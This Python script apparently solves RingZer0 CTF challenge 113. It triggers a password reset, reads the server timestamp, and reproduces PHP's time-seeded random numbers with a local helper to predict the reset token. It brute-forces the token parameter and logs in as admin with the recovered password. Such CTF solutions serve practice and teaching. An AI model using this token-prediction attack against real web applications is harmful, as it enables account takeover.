#!/usr/bin/env python
# -*- coding: utf-8 -*-
import ringzer0
import sys
from email.utils import parsedate_tz
from email.utils import mktime_tz
from subprocess import check_output

def ch113():
	ch, s = 113, ringzer0.login()
	ch_url = ringzer0.get_url('/challenges/{0}'.format(int(ch)))
	
	ringzer0.output('solving')
	ringzer0.output('resetting password')
	r = s.post(ch_url, data={'reset_username':''})
	lines = ringzer0.get_lines(r.text)
	r2822 = lines[0]
	ts = mktime_tz(parsedate_tz(r2822))
	rmin, rmax = 1000000000000000, 9999999999999999
	
	ringzer0.output('seeding random values')
	password, sec_diff = None, 1
	for sec in range(0, sec_diff + 1):
		if password: break
		diff = sec_diff - sec
		seed = ts - diff
		output = check_output(['./php-xrandom', str(seed), '0', str(rmin), str(rmax)]).strip()
		for line in output.split('\n'):
			rtype, rvalue = line.split(':')
			rtype, rvalue = rtype.strip(), rvalue.strip()
			if rtype != 'linux.rand.64': 
				continue
			r = s.get('{0}/?k={1}'.format(ch_url, rvalue))
			response = ringzer0.get_response(r.text)
			ringzer0.output('try: {0}s => {1} ({2}) => {3}'.format(-diff, rvalue, rtype, response))
			if response.find('password') != -1:
				password = response
				break
	if password is None:
		ringzer0.error('could not solve.')
		sys.exit(1)
	password = password.split(' ')[-1:][0]
	ringzer0.output('solved', password)
	r = s.post(ch_url, data={'username':'admin', 'password':password})
	response = ringzer0.get_response(r.text)
	ringzer0.output('response', response)

if __name__ == '__main__':
	ch113()
